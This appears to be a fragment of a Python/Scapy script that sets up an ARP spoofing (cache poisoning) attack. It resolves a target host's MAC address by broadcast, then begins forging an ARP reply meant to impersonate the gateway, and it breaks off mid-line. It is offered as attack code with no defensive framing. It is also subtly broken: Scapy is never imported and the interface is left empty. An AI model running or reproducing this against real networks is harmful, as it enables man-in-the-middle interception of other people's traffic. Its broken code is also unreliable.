import socket
socket.if_indextoname(3)

# Initialize variables
interface       = ""
target_ip       = "192.168.1.100"
gateway_ip      = "192.168.1.1"
packet_count    = 1000

# Set confiuration of target IP and gateway IP
conf.iface = interface

# read in the host to MAC address
conf.verb  = 0
ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = target_ip), timeout = 2, iface = interface, inter = 0.1)

# print out the result
for snd, rcv in ans:
    print rcv.sprintf(r"%Ether.src% - %ARP.psrc%")

# set the target MAC address to variable
target_mac = rcv.sprintf(r"%Ether.src%")

# set the op and hwtype to the packet
arp = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc
